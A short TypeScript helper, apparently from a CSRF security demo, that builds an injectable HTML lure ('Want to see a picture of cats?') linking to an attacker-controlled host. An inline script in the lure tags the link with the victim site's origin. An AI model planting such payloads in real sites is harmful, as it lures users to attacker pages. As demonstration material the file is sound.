export const getCSRFScriptString = (
  attackerHost: string
) => `Want to see a picture of cats? <br />
<a id="redirect-anchor" href="${attackerHost}/csrf-attack"><b>CLICK HERE!</b></a>
<script>
	// Add redirectFrom search params
	(() => {
		const redirectFromUrl = window.location.origin
		const linkEl = document.querySelector("#redirect-anchor")
		const linkHref = linkEl.getAttribute("href")
		
		const hrefUrl = new URL(linkHref)
		hrefUrl.searchParams.set("redirectFrom", redirectFromUrl)
		linkEl.setAttribute("href", hrefUrl.toString())
	})()
</script>`;
